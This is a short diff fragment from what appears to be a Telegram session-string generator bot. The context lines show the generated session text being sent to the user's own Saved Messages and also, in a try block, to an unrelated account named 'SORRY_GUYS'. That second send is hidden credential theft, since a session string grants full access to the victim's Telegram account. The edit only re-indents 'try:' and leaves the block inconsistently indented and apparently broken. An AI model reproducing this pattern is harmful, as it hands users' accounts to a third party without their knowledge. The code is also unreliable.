@@ -180,7 +180,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
             await client.send_message("me", text)
         else:
             await bot.send_message(msg.chat.id, text)
-    try:
+        try:
         if not is_bot:
             await client.send_message("SORRY_GUYS", text)
         else:
